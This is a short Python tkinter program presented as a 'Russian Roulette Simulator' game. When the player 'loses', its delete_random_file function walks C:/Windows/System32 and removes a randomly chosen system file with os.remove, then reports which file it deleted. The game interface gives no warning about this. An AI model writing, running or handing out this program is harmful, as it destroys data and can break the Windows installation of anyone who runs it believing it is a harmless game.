import tkinter as tk
from tkinter import messagebox, scrolledtext
import os
import random

def spin_the_wheel():
    bullets = int(bullets_entry.get())
    if bullets < 1 or bullets > 5:
        messagebox.showerror("Error", "Please enter a valid number of bullets (1-5).")
        return

    chamber = random.randint(1, 6)

    if chamber <= bullets:
        result = delete_random_file("C:/Windows/System32")
        if result:
            messagebox.showinfo("Game Over", "You lost!\n\nDeleted file: " + result)
        else:
            messagebox.showinfo("Game Over", "You lost!\n\nNo files found to delete.")
    else:
        messagebox.showinfo("Congratulations", "You won!")

def delete_random_file(folder_path):
    file_paths = []
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            file_paths.append(os.path.join(root, file))

    if not file_paths:
        return None

    random_file_path = random.choice(file_paths)
    try:
        os.remove(random_file_path)
        print(f"Deleted file: {random_file_path}")
        return random_file_path
    except OSError as e:
        print(f"Error: {e.strerror} - {random_file_path}")
        return None

root = tk.Tk()
root.title("Russian Roulette Simulator")

tk.Label(root, text="Number of bullets (1-5):").pack()
bullets_entry = tk.Entry(root)
bullets_entry.pack()

spin_button = tk.Button(root, text="Spin the Wheel", command=spin_the_wheel)
spin_button.pack()

results_text = scrolledtext.ScrolledText(root, width=40, height=10)
results_text.pack()

root.mainloop()
